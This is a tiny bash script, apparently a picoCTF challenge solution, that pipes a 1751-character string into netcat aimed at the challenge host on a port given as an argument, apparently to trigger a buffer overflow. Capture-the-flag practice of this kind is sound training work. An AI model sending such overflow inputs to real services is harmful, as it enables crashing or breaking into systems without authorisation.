#!/bin/bash

#python3 -c 'print("e"*1751)'
#$1 should be given as an argument the script corresponding at the netcat port number

python3 -c 'print("e"*1751)' | nc foggy-cliff.picoctf.net $1